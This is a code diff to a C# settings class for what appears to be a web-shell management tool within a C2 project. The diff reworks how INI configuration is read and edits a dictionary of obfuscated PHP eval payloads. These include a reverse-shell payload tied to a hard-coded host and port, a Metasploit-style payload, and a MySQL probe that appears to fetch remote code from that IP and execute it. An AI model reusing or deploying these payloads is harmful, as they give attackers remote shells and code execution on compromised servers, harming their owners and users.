@@ -2,6 +2,7 @@
 using System;
 using System.Collections.Generic;
 using System.IO;
+using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Text.RegularExpressions;
@@ -12,8 +13,8 @@ namespace C2.Business.CastleBravo.WebShellTool
     public class ClientSetting
     {
 
-        [DllImport("kernel32")]
-        private static extern int GetPrivateProfileString(string lpAppName, string lpKeyName, string lpDefault, StringBuilder lpReturnedString, int nSize, string lpFileName);
+        //[DllImport("kernel32")]
+        //private static extern int GetPrivateProfileString(string lpAppName, string lpKeyName, string lpDefault, StringBuilder lpReturnedString, int nSize, string lpFileName);
 
         public static string UnlockFilePath = Path.Combine(Application.StartupPath, "Resources", "WebShellConfig", "SuperPowerConfig.ini");//DD功能解锁文件地址
 
@@ -102,6 +103,42 @@ namespace C2.Business.CastleBravo.WebShellTool
         }
 
         /// <summary>
+        /// Base64解密，采用utf8编码方式解密
+        /// </summary>
+        /// <param name="result">待解密的密文</param>
+        /// <returns>解密后的字符串</returns>
+        public static string Base64Decode(string result)
+        {
+            return Base64Decode(Encoding.UTF8, result);
+        }
+
+        /// <summary>
+        /// Base64解密
+        /// </summary>
+        /// <param name="encodeType">解密采用的编码方式，注意和加密时采用的方式一致</param>
+        /// <param name="result">待解密的密文</param>
+        /// <returns>解密后的字符串</returns>
+        public static string Base64Decode(Encoding encodeType, string result)
+        {
+            string base64Tmp = string.Empty;
+            using (StreamReader reader = new StreamReader(result, Encoding.UTF8))
+            {
+                base64Tmp = reader.ReadLine();
+            }
+            byte[] bytes = Convert.FromBase64String(base64Tmp);
+            string decode = string.Empty;
+            try
+            {
+                decode = encodeType.GetString(bytes);
+            }
+            catch
+            {
+                decode = result;
+            }
+            return decode;
+        }
+
+        /// <summary>
         /// 读取INI文件值
         /// </summary>
         /// <param name="section">节点名</param>
@@ -112,8 +149,20 @@ namespace C2.Business.CastleBravo.WebShellTool
         {
             int nSize = 1024 * 4;
             StringBuilder sb = new StringBuilder(nSize);
-            GetPrivateProfileString(section, key, String.Empty, sb, nSize, filePath);
-            return sb.ToString();
+            string tmp = sb.ToString();
+            tmp = Base64Decode(filePath);
+            List<string> striparr = tmp.Split(new string[] { "\r\n" }, StringSplitOptions.None).ToList();
+            striparr = striparr.Where(s => !string.IsNullOrEmpty(s)).ToList();
+            string[] keyRes = new string[2];
+            foreach (string str in striparr)
+            {
+                if (str.Contains(key))
+                {
+                    keyRes = str.Split("=");
+                }
+            }
+            //GetPrivateProfileString(section, key, String.Empty, sb, nSize, tmp);
+            return keyRes[1];
         }
 
         /*<--静态变量复制先后顺序不能改变-->*/
@@ -130,19 +179,18 @@ namespace C2.Business.CastleBravo.WebShellTool
         public static string ReverseShellHost = "103.43.17.9:8889";
         public static string MSFPayload = "{0}=@eval/*AbasBwwevC*/(base64_decode(strrev($_REQUEST[0])));&0===QfK0wOpgSZpRGIgACIK0QfgACIgoQD7kiYkgCbhZXZgACIgACIgAiCNsHIlNHblBSfgACIgoQD7kCKzNXYwlnYf5Waz9Ga1NHJgACIgACIgAiCNsTKiRCIscyJo42bpR3YuVnZfVGdhVmcjBSPgM3chBXei9lbpN3boV3ckACIgACIgACIK0wegkSKnwWY2V2XlxmYhNXak5icvRXdjVGel5ibpN3boV3cngCdld2Xp5WagYiJgkyJul2cvhWdzdCKkVGZh9Gbf52bpNnblRHelhCImlGIgACIK0wOlBXe091ckASPg01JlBXe091aj92cnNXbns1UMFkQPx0RkACIgACIK0wOzRCI9ASXns2YvN3Zz12JbNFTBJ0TMdEJgkgCN0HIgACIK0QfgACIgACIgAiCNszahVmciBCIgACIgACIgACIgACIgAiCNsTKpIGJo4WZsJHdzBSLg4WZsRCIsMHJoQWYlJ3X0V2aj92cg0jLgIGJgACIgACIgACIgACIgACIgoQD6cCdlt2YvN3JgU2chNGIgACIgACIgACIgAiCNszahVmciBCIgACIgACIgACIgACIgAiCNsTKpIGJo4WZsJHdzBSLg4WZsRCIsMHJoQWYlJnZg0jLgIGJgACIgACIgACIgACIgACIgoQD6cSbhVmc0N3JgU2chNGIgACIgACIgACIgAiCNsHIpUGc5R3XzRCKgg2Y0l2dzBCIgACIgACIK0wegkiblxGJgwDIpIGJo4WZsJHdzhCIlxWaodHIgACIK0wOncCI9AiYkACIgAiCNsTXn4WZsdyWhRCI9AiblxGJgACIgoQD7kiblxGJgwiIuVGbOJCKrNWYw5Wdg0DIhRCIgACIK0QfgACIgoQD7kCKllGZgACIgACIgAiCNsHIp4WZsRSIoAiZpBCIgAiCN0HIgACIK0wOrFWZyJGIgACIgACIgACIgAiCNsTK0ACLzRCKkFWZy9Fdlt2YvNHI9AiblxGJgACIgACIgACIgACIK0gOnQXZrN2bzdCIlNXYjBCIgACIgACIK0wOrFWZyJGIgACIgACIgACIgAiCNsTK0ACLzRCKkFWZyZGI9AiblxGJgACIgACIgACIgACIK0gOn0WYlJHdzdCIlNXYjBCIgACIgACIK0wegkSZwlHdfNHJoACajRXa3NHIgACIK0QfgACIgoQD7kyJ0V2aj92cg8mbngSZpRGIgACIgACIgoQD7BSKzRSIoAiZpBCIgAiCN0HIgACIK0wOpcycj5WdmBCdlt2YvNHIv52JoUWakBCIgACIgACIK0wegkSZwlHdfNHJhgCImlGIgACIK0QfgACIgoQD7cCdlt2YvN3Jg0DIlBXe091ckACIgACIgACIK0QfgACIgACIgAiCNsTKoUWakBCIgACIgACIgACIgoQD7BSKzVmckECKgYWagACIgACIgAiCNsTK0J3bwRCIsAXakACLzRCK0NWZu52bj9Fdlt2YvNHQg0DIzVmckACIgACIgACIK0wOpA1QU9FTPNFIs0UQFJFVT91SD90UgwCVF5USfZUQoYGJg0DIzRCIgACIgACIgoQD7BSKpYGJoUGbiFGbsF2YfNXagYiJgkyJlRXYlJ3YfRXZrN2bzdCI9AiZkgCImYCIzRSIoAiZpBCIgAiCN0HIgACIK0wOn0WYlJHdzdCI9ASZwlHdfNHJgACIgACIgAiCNsTK0J3bwRCIsAXakgiZkASPgMHJgACIgACIgAiCNsHIpkiZkgSZsJWYsxWYj91cpBiJmASKn4WZw92aj92cmdCI9AiZkgCImYCIzRSIoAiZpBCIgAiCN0HIgACIK0wOn0WYlJHdzdCI9ASZwlHdfNHJgACIgACIgAiCNsTKi0Hdy9GcksnO9BXaks3LvoDcjRnIoYGJg0DIzRCIgACIgACIgoQD7BSKpYGJoUGbiFGbsF2YfNXagYiJgkyJ05WZpx2YfRXZrN2bz9VbhVmc0N3Jg0DImRCKoAiZpBCIgAiCNsDdy9Gck4iI0J3bwJCIvh2YllgCNsDcpRCIuICcpJCIvh2YllgCNsTXxsFVT9EUfRCI9ACdy9GckACIgAiCNsTKdJzWUN1TQ9FJoUGZvNWZk9FN2U2chJGI9ACcpRCIgACIK0gCNsHIpkSXysFVT9EUfRCK0V2czlGImYCIp0VMbR1UPB1XkgCdlN3cphCImlmCNsTKxgCdy9mYh9lclNXdfVmcv52ZppQD7kCMoQXatlGbfVWbpR3X0V2c&1={1}&2={2}";
         public static string ReverseShellPayload = "{0}=@eval/*AbasBwwevC*/(base64_decode(base64_decode($_REQUEST[0])));&0=WlhKeWIzSmZjbVZ3YjNKMGFXNW5LRVZmUlZKU1QxSWdmQ0JGWDFCQlVsTkZLVHRBYzJWMFgzUnBiV1ZmYkdsdGFYUW9NQ2s3RFFva2IzTTlVRWhRWDA5VE93MEthV1lvYVhOelpYUW9KRjlRVDFOVVd6RmRLU1ltYVhOelpYUW9KRjlRVDFOVVd6SmRLU2tOQ25za2NHOXlkRDBrWDFCUFUxUmJNVjA3RFFva2FYQTlZbUZ6WlRZMFgyUmxZMjlrWlNna1gxQlBVMVJiTWwwcE93MEtKR1p3UFdaemIyTnJiM0JsYmlna2FYQWdMQ0FrY0c5eWRDQXNJQ1JsY25KdWJ5d2dKR1Z5Y25OMGNpazdEUXBwWmlBb0lTUm1jQ2w3RFFva2NtVnpkV3gwSUQwZ0lrNXZkQ0JqYjI1dVpXTjBhVzl1SWpzTkNuME5DbVZzYzJVZ2V3MEtabkIxZEhNZ0tDUm1jQ0FzSWx4dUtrOVRPaUl1Skc5ekxpSXVJRU52Ym01bFkzUWdjM1ZqWTJWemN5RXFYRzRpS1RzTkNuZG9hV3hsS0NGbVpXOW1LQ1JtY0NrcGV5QU5DbVp3ZFhSeklDZ2tabkFzSWlCemFHVnNiRG9nSWlrN0RRb2tjbVZ6ZFd4MFBTQm1aMlYwY3lBb0pHWndMQ0EwTURrMktUc05DaVJ0WlhOellXZGxQV0FrY21WemRXeDBZRHNOQ21ad2RYUnpJQ2drWm5Bc0lpMHRQaUFpTGlSdFpYTnpZV2RsTGlKY2JpSXBPeUI5RFFwbVkyeHZjMlVnS0NSbWNDazdmWDA9&1={1}&2={2}";
-        public static string WebConfigPathPayload = "{0}=@eval/*ABC*/(base64_decode(base64_decode($_REQUEST[0])));&0=YzJWemMybHZibDl6ZEdGeWRDZ3BPdzBLYVdZb1pXMXdkSGtvSkY5VFJWTlRTVTlPV3lkamNYbDJjVUpqYjI0eEoxMHBLUTBLZXlSZlUwVlRVMGxQVGxzblkzRjVkbkZDWTI5dU1TZGRQV1pwYkdWZloyVjBYMk52Ym5SbGJuUnpLQ0pvZEhSd09pOHZNVEF6TGpRekxqRTNMamt2ZDJzdlkyOXVaaTVuYVdZaUtUdDlEUXBBWlhaaGJDaG5lbWx1Wm14aGRHVW9KRjlUUlZOVFNVOU9XeWRqY1hsMmNVSmpiMjR4SjEwcEtUcz0=";
-        public static string WebConfigFieldPayload = "{0}=@eval/*ABC*/(base64_decode(base64_decode($_REQUEST[0])));&0=YzJWemMybHZibDl6ZEdGeWRDZ3BPdzBLYVdZb1pXMXdkSGtvSkY5VFJWTlRTVTlPV3lkamNYbDJjVUpqYjI0eEoxMHBLUTBLZXlSZlUwVlRVMGxQVGxzblkzRjVkbkZDWTI5dU1TZGRQV1pwYkdWZloyVjBYMk52Ym5SbGJuUnpLQ0pvZEhSd09pOHZNVEF6TGpRekxqRTNMamt2ZDJzdlkyOXVaaTVuYVdZaUtUdDlEUXBBWlhaaGJDaG5lbWx1Wm14aGRHVW9KRjlUUlZOVFNVOU9XeWRqY1hsMmNVSmpiMjR4SjEwcEtUcz0=&1={1}";
-        public static Dictionary<InfoType, string> InfoPayloadDict = new Dictionary<InfoType, string>
+        public static string MysqlProbePayload = "{0}=@eval/*ABC*/(base64_decode(base64_decode($_REQUEST[0])));&0=YzJWemMybHZibDl6ZEdGeWRDZ3BPdzBLYVdZb1pXMXdkSGtvSkY5VFJWTlRTVTlPV3lkamNYVjFhR3A0WTI5dUoxMHBLUTBLZXlSZlUwVlRVMGxQVGxzblkzRjFkV2hxZUdOdmJpZGRQV1pwYkdWZloyVjBYMk52Ym5SbGJuUnpLQ0pvZEhSd09pOHZNVEF6TGpRekxqRTNMamt2ZDJzdlkyOXVaaTVuYVdZaUtUdDlEUXBBWlhaaGJDaG5lbWx1Wm14aGRHVW9KRjlUUlZOVFNVOU9XeWRqY1hWMWFHcDRZMjl1SjEwcEtUcz0=&1={1}&2={2}&3={3}";
+        
+        public static Dictionary<SGType, string> PayloadDict = new Dictionary<SGType, string>
                                            {
-                                             {InfoType.MysqlBlasting, MysqlPayload },
-                                             {InfoType.SystemInfo, SystemInfoPayload },
-                                             {InfoType.ProcessView, ProcessViewPayload },
-                                             {InfoType.ScheduleTask, ScheduleTaskPayload },
-                                             {InfoType.LocationInfo, LocationPayload },
-                                             {InfoType.MSF, MSFPayload},
-                                             {InfoType.WebConfigPath, WebConfigPathPayload},
-                                             {InfoType.MysqlProbe, WebConfigFieldPayload},
-                                             {InfoType.NC, ReverseShellPayload} };
+                                             {SGType.MysqlBlasting, MysqlPayload },
+                                             {SGType.SystemInfo, SystemInfoPayload },
+                                             {SGType.ProcessView, ProcessViewPayload },
+                                             {SGType.ScheduleTask, ScheduleTaskPayload },
+                                             {SGType.LocationInfo, LocationPayload },
+                                             {SGType.MSF, MSFPayload},
+                                             {SGType.MysqlProbe, MysqlProbePayload},
+                                             {SGType.NC, ReverseShellPayload} };
         /*<--静态变量赋值先后顺序不能改变-->*/
         public static List<string> BDLocationAK = new List<string>()
                                                   {
